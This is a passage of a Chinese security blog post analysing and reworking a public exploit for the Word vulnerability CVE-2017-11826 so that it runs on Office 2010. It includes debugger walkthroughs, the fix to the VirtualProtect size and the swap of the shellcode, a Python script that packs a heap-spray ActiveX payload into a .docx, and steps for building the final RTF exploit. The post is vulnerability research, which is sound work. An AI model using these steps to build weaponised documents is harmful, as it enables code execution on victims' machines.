<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804104003516.png" alt="image-20210804104003516" /></p>

<p>再次跳转后进入到kernelbase.dll的VirtualProtect：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804104216392.png" alt="image-20210804104216392" /></p>

<p>执行后会跳转到<code class="language-plaintext highlighter-rouge">0x08888f70</code>执行shellcode：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804104652987.png" alt="image-20210804104652987" /></p>

<p>然而VirtualProtect的修改的内存范围只有<code class="language-plaintext highlighter-rouge">0x08888c90 - 0x08888e91</code>，而shellcode却位于<code class="language-plaintext highlighter-rouge">0x08888f70</code>，因此会触发c0000005访问异常，shellcode执行失败：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804105857160.png" alt="image-20210804105857160" /></p>

<h2 id="利用改造">利用改造</h2>

<p>activeX1.bin文件中布局如下：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804115244951.png" alt="image-20210804115244951" /></p>

<p>由于原本VirtualProtect修改的范围为0x201不够，因此修改为0x1000确保能够覆盖shellcode，随后将shellcode替换为自己的shellcode即可。</p>

<p>将修改好的activeX1.bin文件替换到rtfobj.py提取出来进行堆喷的文档中，并修改为.docx，脚本参考<a href="https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/">Exploiting Word: CVE-2017-11826</a>一文，替换脚本如下：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">shutil</span>
<span class="kn">import</span> <span class="nn">zipfile</span>

<span class="n">template_path</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">final_docx_name</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">activeX_bin_path</span> <span class="o">=</span> <span class="s">""</span>

<span class="k">def</span> <span class="nf">pack_file_to_open_xml_docx</span><span class="p">(</span><span class="n">template_path</span><span class="p">,</span> <span class="n">final_docx_name</span><span class="p">,</span> <span class="n">activeX_bin_path</span><span class="p">):</span> 
    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">template_path</span><span class="p">)</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">activeX_bin_path</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Template docx file or activeX.bin file not exist."</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">activeX_bin_path</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f_</span><span class="p">:</span> 
        <span class="n">object_bin_data</span> <span class="o">=</span> <span class="n">f_</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

    <span class="n">zip_docx</span> <span class="o">=</span> <span class="n">template_path</span> <span class="o">+</span> <span class="s">".zip"</span>
    <span class="n">current_dir</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">__file__</span><span class="p">))</span>
    <span class="n">new_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">current_dir</span><span class="p">,</span> <span class="s">"exp"</span><span class="p">,</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">basename</span><span class="p">(</span><span class="n">zip_docx</span><span class="p">))</span> 
    <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">new_path</span><span class="p">):</span>
        <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">new_path</span><span class="p">)</span>

    <span class="n">shutil</span><span class="p">.</span><span class="n">copy</span><span class="p">(</span><span class="n">template_path</span><span class="p">,</span> <span class="n">new_path</span><span class="p">)</span> 
    <span class="n">zip_docx</span> <span class="o">=</span> <span class="n">new_path</span>
    <span class="c1"># open temp docx and a copy for modification 
</span>    <span class="n">zin</span> <span class="o">=</span> <span class="n">zipfile</span><span class="p">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">zip_docx</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> 
    <span class="n">zip_docx_copy</span> <span class="o">=</span> <span class="n">zip_docx</span> <span class="o">+</span> <span class="s">"_copy_"</span> 
    <span class="n">zout</span> <span class="o">=</span> <span class="n">zipfile</span><span class="p">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">zip_docx_copy</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span>
    <span class="c1"># modify the docx template with exploit 
</span>    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">zin</span><span class="p">.</span><span class="n">infolist</span> <span class="p">():</span>
        <span class="k">if</span> <span class="n">item</span><span class="p">.</span><span class="n">filename</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"activeX1"</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">item</span><span class="p">.</span><span class="n">filename</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">".bin"</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span> 
            <span class="k">pass</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">buffer</span> <span class="o">=</span> <span class="n">zin</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">item</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
            <span class="n">zout</span><span class="p">.</span><span class="n">writestr</span><span class="p">(</span><span class="n">item</span><span class="p">,</span> <span class="nb">buffer</span><span class="p">)</span> <span class="c1"># use existing file
</span>            
    <span class="n">zout</span><span class="p">.</span><span class="n">writestr</span><span class="p">(</span><span class="s">"word/activeX/"</span> <span class="o">+</span> <span class="s">"activeX1.bin"</span><span class="p">,</span> <span class="n">object_bin_data</span><span class="p">)</span> 
    <span class="n">zout</span><span class="p">.</span><span class="n">close</span> <span class="p">()</span> 
    <span class="n">zin</span><span class="p">.</span><span class="n">close</span> <span class="p">()</span>
    <span class="c1"># convert to docx
</span>    <span class="n">os</span><span class="p">.</span><span class="n">rename</span> <span class="p">(</span><span class="n">zip_docx_copy</span><span class="p">,</span> <span class="n">final_docx_name</span><span class="p">)</span> 
    <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">zip_docx</span><span class="p">)</span>

<span class="n">pack_file_to_open_xml_docx</span><span class="p">(</span><span class="n">template_path</span><span class="p">,</span> <span class="n">final_docx_name</span><span class="p">,</span> <span class="n">activeX_bin_path</span><span class="p">)</span>
</code></pre></div></div>

<p>新建一个rtf文件，将替换好的docx文件添加到rtf文件中，保存后使用010Editor打开，搜索object，将{\object和{*\objdata的全部内容复制:</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804120429898.png" alt="image-20210804120429898" /></p>

<p>再新建一个rtf文件，按照堆喷射、Bypass ASLR和漏洞触发的顺序添加三个对象。堆喷射的内容就是上方复制好的内容，其他两个可以直接在原EXP中复制过来即可，最终EXP的结构如下所示：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804141320122.png" alt="image-20210804141320122" /></p>

<p>最终成功执行了shellcode：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804141657444.png" alt="image-20210804141657444" /></p>

<h1 id="参考链接">参考链接</h1>

<p>[1] <a href="https://www.anquanke.com/post/id/87122">CVE-2017-11826漏洞分析、利用及动态检测</a></p>

<p>[2] <a href="https://www.cnblogs.com/goabout2/p/8186018.html">office CVE-2017-11826杂谈</a></p>

<p>[3] <a href="https://www.greyhathacker.net/?p=911">SPRAYING THE HEAP IN SECONDS USING ACTIVEX CONTROLS IN MICROSOFT OFFICE</a></p>

<p>[4] <a href="https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/">Exploiting Word: CVE-2017-11826</a></p>

<p>[5] <a href="https://www.anquanke.com/post/id/103080">Open XML标签解析类漏洞分析思路</a></p>]]></content><author><name>Joey</name></author><category term="漏洞分析" /><summary type="html"><![CDATA[前言 最近开始分析Office漏洞，拿到CVE-2017-11826的样本后发现无法在Office2010上成功执行，打算分析并改造该EXP。参考了许多资料，结合自己的理解写了本文，供大家学习和参考。]]></summary></entry></feed>